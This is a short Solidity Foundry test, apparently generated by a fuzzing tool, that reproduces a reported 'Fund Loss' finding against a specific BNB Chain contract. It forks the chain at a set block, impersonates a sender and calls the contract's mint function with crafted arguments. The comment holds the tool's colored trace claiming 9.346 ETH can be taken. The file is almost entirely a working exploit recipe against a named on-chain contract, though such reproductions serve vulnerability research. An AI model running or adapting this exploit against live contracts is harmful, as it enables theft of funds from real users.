// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

// gecko evm -o -t 0xc342774492b54ce5F8ac662113ED702Fc1b34972 -c bsc --onchain-block-number 22315678 -f -i -p --onchain-etherscan-api-key $BSC_ETHERSCAN_API_KEY
/*

😊😊 Found violations!


================ Description ================
[Fund Loss]: Anyone can earn 9.346 ETH by interacting with the provided contracts

================ Trace ================
[38;2;156;133;16m[Sender] 0xe1A425f1AC34A8a441566f93c82dD730639c8510
   └─[1] [38;2;179;73;114m0xc342774492b54ce5F8ac662113ED702Fc1b34972.[38;2;255;123;114mmint(1208907.3728 ether, 0x00000000004000000000000000000000000018ac, [38;2;205;121;221m0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd, (), (), ())


 */

contract Cc342 is Test {
    function setUp() public {
        vm.createSelectFork("bsc", 22315678);
    }

    function test() public {
        vm.prank(0xe1A425f1AC34A8a441566f93c82dD730639c8510);
        bytes32[] memory arr0 = new bytes32[](0);
        bytes32[] memory arr1 = new bytes32[](0);
        uint8[] memory arr2 = new uint8[](0);
        I(0xc342774492b54ce5F8ac662113ED702Fc1b34972).mint(1208907.3728 ether, "     @            �", 0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd, arr0, arr1, arr2);
    }

}

interface I {
    function mint(uint256,string memory,address,bytes32[] memory,bytes32[] memory,uint8[] memory) external payable;
}
